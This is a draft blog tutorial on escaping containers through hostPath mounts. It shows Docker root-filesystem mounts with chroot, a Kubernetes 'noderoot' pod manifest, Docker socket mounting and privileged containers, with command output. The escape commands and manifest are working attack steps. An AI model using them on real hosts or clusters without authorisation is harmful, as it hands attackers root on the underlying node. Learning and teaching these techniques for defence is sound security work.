+++
date = '2025-03-04T21:55:26-05:00'
draft = true
title = 'HostPath'
+++

Abusing HostPath to escape containers.

---

## Mounting Root Volumes Inside Containers

### Docker
Run an alpine container with root filesystem mounted under `/host` in the container
```
$ docker run --rm -it -v /:/host alpine:latest /bin/sh
$ / # cat /etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.12.0
PRETTY_NAME="Alpine Linux v3.12"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.org/"
```

Changing my root directory to the `/host` directory with `chroot` allows us to break out of the container.
```
/ # ls
bin    etc    host   media  opt    root   sbin   sys    usr
dev    home   lib    mnt    proc   run    srv    tmp    var

/ # chroot /host bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@3396f9188944:/#
```
Show release information has changed to Ubuntu (WSL)
```
root@3396f9188944:/# cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.1 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.1 LTS"
VERSION_ID="20.04"
...<snip>...
```

Access to drives on the host
```
$ root@3396f9188944:/# df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sdb        251G   28G  211G  12% /
tools           1.8T  1.7T  131G  93% /init
none             13G     0   13G   0% /dev
tmpfs            13G     0   13G   0% /sys/fs/cgroup
...<snip>...
tmpfs            13G     0   13G   0% /mnt/wsl
C:\             1.8T  1.7T  131G  93% /mnt/c
D:\             112G   11G  102G  10% /mnt/d
```

### Kubernetes
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: noderoot
spec:
  containers:
  - name: noderoot
    image: raesene/alpine-containertools
    imagePullPolicy: Always
    volumeMounts:
    - name: root
      mountPath: "/host"
  volumes:
  - name: root
    hostPath:
      path: "/"
```
Exec into pod to see mounted host directory just like docker
```
$ kubectl apply -f noderoot.yaml
pod/noderoot created

$ kubectl exec -it pod/noderoot -- /bin/bash
bash-5.0# chroot /host bash
[root@noderoot /]#
```

`chroot` onto the host
```
[root@noderoot /]# cat /etc/os-release
NAME=Fedora
VERSION="33.20210104.3.1 (CoreOS)"
ID=fedora
VERSION_ID=33
VERSION_CODENAME=""
PLATFORM_ID="platform:f33"
PRETTY_NAME="Fedora CoreOS 33.20210104.3.1"
...<snip>...
```

### Docker Socket
The docker socker on the host is located at `/var/run/docker.sock`. Mounting this inside a container will allow processes running inside the container to interact with the docker daemon, and run additional containers.
```
$ docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker /bin/sh
/ # docker version
Client: Docker Engine - Community
 Version:           20.10.2
 API version:       1.41
 Go version:        go1.13.15
 Git commit:        2291f61
 Built:             Mon Dec 28 16:11:26 2020
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true
...<snip>...
```

We can even see our own container running.
```
/ # docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED              STATUS              PORTS     NAMES
e52efd14f85c   docker    "docker-entrypoint.s…"   About a minute ago   Up About a minute             dreamy_poincare
```

### Privileged Containers
Although we have complete access to the hosts filesystem, we still lack some capabilities we'd want to completely bypass all restrictions of the container and get true `root`.

Use `capsh` to show some capabilities are missing, such as `cap_sys_admin`, the biggest bundle of privileges.
```
root@3396f9188944:/# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
```

Run the container again, but using privileged flag and see we have `cap_sys_admin` and have truely broken out as `root`.
```
$ docker run --rm -it --privileged -v /:/host alpine:latest /bin/sh
/ # chroot /host bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@33507db52673:/# capsh --print
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
...
```

---

## References
- [Linux Capabilities](https://linux-audit.com/linux-capabilities-101/)
- [The Path Less Traveled: Abusing K8s Defaults - Ian Coldwater & Duffy Cooley](https://www.youtube.com/watch?v=HmoVSmTIOxM)
- [Seccomp Security Profiles and You - Duffy Cooley](https://www.youtube.com/watch?v=OPuu8wsu2Zc)
- [Kubernetes Goat - Intentional Vulnerable K8s Cluster](https://github.com/madhuakula/kubernetes-goat)
